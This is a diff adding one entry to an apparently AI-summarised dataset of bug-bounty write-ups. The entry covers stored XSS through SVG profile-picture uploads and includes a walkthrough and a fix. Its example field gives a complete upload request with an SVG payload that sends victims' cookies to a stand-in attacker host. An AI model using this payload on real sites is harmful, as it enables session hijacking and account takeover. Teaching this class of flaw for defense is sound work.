@@ -41,6 +41,47 @@
     "score": 47
   },
   {
+    "id": "66efcd1e5ab4",
+    "title": "SVG Injection: When a Profile Picture Upload Becomes a JavaScript Execution Vector",
+    "url": "https://medium.com/@deepanshuladwal29/svg-injection-when-a-profile-picture-upload-becomes-a-javascript-execution-vector-712a54d48a24",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "Deepanshu"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-24T11:48:05.000Z",
+    "added_at": "2026-11-24T21:01:17.255Z",
+    "categories": [
+      "file-upload",
+      "xss"
+    ],
+    "severity": "high",
+    "difficulty": "beginner",
+    "summary_en": "An SVG file uploaded as a profile picture bypassed image type checks, executing JavaScript in users’ browsers and stealing cookies and JWT tokens.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The application advertised that only JPG, GIF, and JPEG files were allowed for profile pictures, but the server‑side validation only checked the file extension and not the actual MIME type. An attacker uploaded a file with a .svg extension, which the server accepted and stored in an S3 bucket. SVG (Scalable Vector Graphics) is an XML‑based image format that can contain <script> tags, allowing JavaScript execution when rendered. The server did not sanitize the SVG content before serving it, so the embedded script ran in the victim’s browser. Because the profile picture is displayed automatically on the user’s profile page, the malicious script executed every time the page was visited, enabling theft of authentication cookies and JWT tokens.",
+      "walkthrough": "RECON\nStep 1: Identify the profile picture upload feature on the web application. Why: The feature is a part of the site that lets users send files to the server (definition: HTTP request is a message a browser sends to a server).\nStep 2: Observe the client‑side file‑type filter that lists JPG, GIF, and JPEG as allowed. Why: The filter is a visual hint, not a security control (definition: client‑side means it runs in the browser).\n\nDISCOVERY\nStep 3: Attempt to upload a file with a .svg extension despite the filter. Why: The server may only check the file name, not its content (definition: server‑side validation is the code that decides if a file is acceptable).\nStep 4: The server responds with a successful upload and stores the file in an S3 bucket. Why: The backend accepted the file and saved it to cloud storage (definition: S3 is Amazon’s object storage service).\n\nEXPLOITATION\nStep 5: Create an SVG file that contains a <script> tag that reads document.cookie and sends it to an attacker‑controlled domain. Why: SVG can embed JavaScript, and reading cookies allows session hijacking (definition: cookie is a small piece of data the browser sends with each request).\nStep 6: Upload the malicious SVG using the same upload endpoint.\nStep 7: Visit the victim’s profile page where the uploaded image is rendered.\nStep 8: The browser parses the SVG, encounters the <script> tag, and executes the JavaScript, which exfiltrates the cookie and JWT token. Why: The script runs in the context of the victim’s site (definition: JavaScript execution means the code runs inside the browser).\n\nIMPACT\nStep 9: Capture the stolen token from the attacker server logs. Why: The attacker now has credentials to impersonate the victim.\nStep 10: Use the JWT token to call authenticated API endpoints as the victim. Why: JWT (JSON Web Token) proves identity to the server.",
+      "example": "Assume a fictional site https://target.example that lets users upload a profile picture via POST /api/upload with a form field named \"file\". The server only checks that the filename ends with .jpg, .jpeg, or .png. An attacker sends a request:\n\nPOST https://target.example/api/upload\nContent-Type: multipart/form-data; boundary=---123\n---123\nContent-Disposition: form-data; name=\"file\"; filename=\"exploit.svg\"\nContent-Type: image/svg+xml\n\n<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('https://attacker.example/steal?c='+document.cookie)</script></svg>\n---123--\n\nBecause the server only looks at the filename extension, it stores the SVG. When any user views the profile, the SVG is rendered, the <script> runs, and the victim’s cookie is sent to attacker.example. This works for the same reason as the original bug: lack of proper MIME‑type validation and SVG sanitisation.",
+      "takeaway": "When testing file‑upload features, always try formats that are technically images but can contain code, such as SVG, WebP, or PDF. Look for client‑side filters that list allowed extensions and verify the server validates the MIME type and sanitises content. Tools like Burp Intruder or curl can help send files with unexpected extensions. Variants of this issue appear as \"SVG XSS\" or \"PDF JavaScript injection\". Beginners often assume that restricting extensions is enough; remember that the server must also inspect the file’s actual type and strip executable content.",
+      "fix": "Validate the uploaded file on the server by checking both the file extension and the MIME type (e.g., using libmagic or a similar library). Reject any file whose MIME type is not an allowed raster image (image/jpeg, image/png, image/gif). If SVG support is required, parse the SVG and remove all <script>, onload, and other potentially dangerous attributes before storing or serving it. Store uploaded files outside the web root or serve them through a content‑delivery service that sets the Content‑Security‑Policy header to disallow script execution. Example fix (Node.js/Express):\n\nif (!allowedExtensions.includes(path.extname(file.originalname))) return res.status(400).send('Invalid extension');\nif (!allowedMimeTypes.includes(file.mimetype)) return res.status(400).send('Invalid MIME type');\n// If SVG, sanitize with DOMPurify before saving",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Hi, I’m **Deepanshu Ladwal**, a security researcher and bug hunter, Let’s get straight to the interesting part. while Doing internal Testing on a a company i counter a feature upload profile picture where we have permission to upload only JPG,GIF,JPG file . Image 4 I randomly server the file .svg which is accepted by the server . Then i though shall we embedded a svg file which contain java-script code so i did chat gpt Press enter or click to view image in full size Image 5 generate a file to XXS , which eventually store in s3 buckets. After that we click on profile picture java script code e",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "f6c103d6e017",
     "title": "One Delimiter Too Many: The $100,000 GitHub Bug Hiding in git push",
     "url": "https://medium.com/@t4nv1/one-delimiter-too-many-the-100-000-github-bug-hiding-in-git-push-41546fa5fe9a",
